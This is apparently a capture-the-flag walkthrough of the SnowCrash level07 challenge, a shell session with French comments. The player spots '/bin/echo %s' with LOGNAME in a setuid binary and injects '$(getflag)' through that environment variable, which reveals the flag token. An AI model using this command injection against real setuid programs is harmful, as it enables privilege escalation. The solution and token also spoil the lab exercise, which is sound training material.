@@ -1,0 +1,36 @@
+level07@SnowCrash:~$ ls -la
+total 24
+dr-x------ 1 level07 level07  120 Mar  5  2016 .
+d--x--x--x 1 root    users    340 Aug 30  2015 ..
+-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
+-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
+-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
+-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
+level07@SnowCrash:~$ ./level07 
+level07
+level07@SnowCrash:~$ ./level07  oiasjdoisaj
+level07
+level07@SnowCrash:~$ hexdump -C ./level07 
+00000000  7f 45 4c 46 01 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
+...
+00000670  ff 83 c4 08 5b c3 00 00  03 00 00 00 01 00 02 00  |....[...........|
+00000680  4c 4f 47 4e 41 4d 45 00  2f 62 69 6e 2f 65 63 68  |LOGNAME./bin/ech|
+00000690  6f 20 25 73 20 00 00 00  01 1b 03 3b 30 00 00 00  |o %s ......;0...|
+...
+00002260  69 6e 69 74 00                                    |init.|
+00002265
+
+Visiblement il echo la variable LOGNAME ?
+
+level07@SnowCrash:~$ env
+LC_PAPER=fr_FR.UTF-8
+...
+LOGNAME=level07
+...
+_=/usr/bin/env
+
+On va editer la variable d'env LOGNAME pour que le fichier execute getflag comme flag07 execute ce fichier
+
+level07@SnowCrash:~$ export LOGNAME='$(getflag)'
+level07@SnowCrash:~$ ./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
